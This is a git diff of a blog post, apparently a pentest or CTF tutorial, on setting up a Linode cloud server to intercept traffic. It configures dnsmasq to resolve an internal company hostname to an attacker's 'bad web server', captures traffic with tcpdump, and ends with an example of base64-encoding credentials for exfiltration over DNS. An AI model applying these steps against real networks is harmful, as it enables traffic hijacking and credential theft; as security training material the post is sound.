@@ -8,9 +8,13 @@ permalink: blog/dynamic-public-cloud-server-ftw.html
 tags: [cloud, dns, intercept traffic, CTF, Linode]
 ---
 > This is for the pirates who clap
+
 > And love the sound
+
 > Attacking from the cloud
+
 > Then we're back and underground
+
 ~ Dual Core, All The Things
 
 TL;DR.
@@ -46,7 +50,7 @@ Signing up for the cloud provider is a straight forward process.  No surprises h
 
 Once you click the create button it takes a few seconds for the new box to provision and boot.  The __Summary__ page lists the IPv4 and IPv6 addresses.
 
-![boot](/images/overcast/dynamic-public-cloud-server-ftw/03-boot.png){:height="50%" width="50%"}
+![booted](/images/overcast/dynamic-public-cloud-server-ftw/03-boot.png){:height="50%" width="50%"}
 
 Two console web shells options are provided by Linode (Weblish and Glish) but you'll want to use your own SSH session from your box.  Once you gain SSH access you can do all the normal sysadmin things to scaffold your platform.  I was raised by graybeards so the lack of maintaining tools such as netstat and ifconfig is disconcerting to say the least.  Yet I will resist the urge to install net-tools.  This host is bare bones right now so let's add what we need.
 
@@ -84,13 +88,26 @@ On the nanode edit __/etc/dnsmasq.conf__:
 * Uncomment the "__#no-resolv__" line (around line 54) so that your DNS server won't send requests upstream.
 * Uncomment and modify line 131 to point to your local file for dnsmasq host resolution instead of /etc/hosts.
     ```addn-hosts=/etc/dnsmasq.hosts```
-* Create the __/etc/dnsmasq.hosts__ file and set your bad web server IP address (eg. 1.2.3.4) to the hostname of the internal good web server.  This will resolve the good web server name to your bad web server.
-```BAD_WEB_SERVER_IP    goodwebserver.company.com```
+* Create the __/etc/dnsmasq.hosts__ file and set your bad web server IP address to the hostname of the internal good web server.  This will resolve the good web server name to your bad web server.
 
-The addn-host file (dnsmasq.hosts) can be named anything and has the same content format as /etc/hosts.  Be aware though Linux can default to running its preinstalled dnsmasq as a service.  So if you attempt to start manually it will throw errors.  If you want greater control the default service can be stopped ```service dnsmasq stop``` and run manually, or in the background with &, ```dnsmasq --no-daemon --log-queries --log-facility=/var/log/dnsmasq.log```.  When not run in the background (or without tcpdump) the log file can be tailed to show any DNS queries ```tail -f /var/log/dnsmasq.log``` or parsed by one of your amazing scripts.
+    ```
+    BAD_WEB_SERVER_IP    goodwebserver.company.com
+    ```
+
+The addn-host file (dnsmasq.hosts) can be named anything and has the same content format as /etc/hosts.  Be aware though Linux can default to running its preinstalled dnsmasq as a service.  So if you attempt to start manually it will throw errors.  If you want greater control the default service can be stopped ```service dnsmasq stop``` and run manually, or in the background with &, 
+
+```bash
+dnsmasq --no-daemon --log-queries --log-facility=/var/log/dnsmasq.log
+```
+
+When not run in the background (or without tcpdump) the log file can be tailed to show any DNS queries ```tail -f /var/log/dnsmasq.log``` or parsed by one of your amazing scripts.
 
 ### Inspect Traffic
-```tcpdump udp port 53 or tcp port 80 or tcp port 443```
+
+```bash
+tcpdump udp port 53 or tcp port 80 or tcp port 443
+```
+
 For more verbosity use ```-v``` or ```-vv``` for a flood of connection information.  When you are in security researcher mode it helps to limit the scope to the specific protocol and port being evaluated.  This prevents unnecessary noise and keeps the content concise for the write-up.
 
 If you have data to exfiltrate, such as ```echo "user:admin;pass:pfi9503" | base64 | sed 's/=//g'```, send it to your DNS server.
